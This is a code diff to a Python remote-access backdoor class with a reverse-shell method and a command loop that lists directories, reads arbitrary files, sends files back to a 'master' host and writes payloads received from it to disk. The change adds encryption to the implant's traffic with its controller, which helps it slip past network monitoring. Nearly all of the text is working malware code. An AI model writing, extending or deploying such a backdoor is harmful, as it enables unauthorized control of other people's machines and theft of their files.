@@ -6,10 +6,11 @@ from subprocess import run
 from time import sleep
 
 class Backdoor():
-    def __init__(self, conn, master_hostname, master_port):
+    def __init__(self, conn, master_hostname, master_port, crypto):
         self.conn = conn
         self.master_hostname = master_hostname
         self.master_port = master_port
+        self.crypto = crypto
 
     def reverse_shell(self):
         pid = fork()
@@ -28,15 +29,18 @@ class Backdoor():
     def send_res(self, res):
         try:
             res = "ACK" + res
-            self.conn.send(res.encode())
+            encoded_res = res.encode("utf-8")
+            encrypted_res = self.crypto.encrypt(encoded_res)
+            self.conn.send(encrypted_res)
         except socket_error:
             # error sending data to master
             exit(0)
 
-    def recv_cmd(self):
+    def recv_cmd(self, buf):
         try:
-            encoded_cmd = self.conn.recv(1024)
-            cmd = encoded_cmd.decode()
+            encrypted_cmd = self.conn.recv(buf)
+            encoded_cmd = self.crypto.decrypt(encrypted_cmd) 
+            cmd = encoded_cmd.decode("utf-8")
             return cmd
         except socket_error:
             # error connecting to master to recv data
@@ -44,8 +48,7 @@ class Backdoor():
 
     def cmd_shell(self):
         while True:
-            cmd = self.recv_cmd()
-
+            cmd = self.recv_cmd(1024)
             res = ""
             if cmd[:2] == "ls":
                 res = ""
@@ -59,9 +62,13 @@ class Backdoor():
             elif cmd[:3] == "pwd":
                 res = str(getcwd())
             elif cmd[:3] == "cat":
-                with open(cmd[3:], "r") as fp:
-                    data = fp.read()
-                res += data
+                data = ""
+                try:
+                    with open(cmd[4:], "r") as fp:
+                        data = fp.read()
+                    res += data
+                except:
+                    res = "error opening file"
             elif cmd[:2] == "dl":
                 filepath = cmd[3:]
                 try:
@@ -73,8 +80,7 @@ class Backdoor():
                 res = str(data)
             elif cmd[:2] == "pl":
                 filename = "master_dl"
-                encoded_data = self.conn.recv(64000)
-                data = encoded_data.decode()
+                data = self.recv_cmd(64000)
                 fp = open(filename, "w")
                 fp.write(data)
                 fp.close()
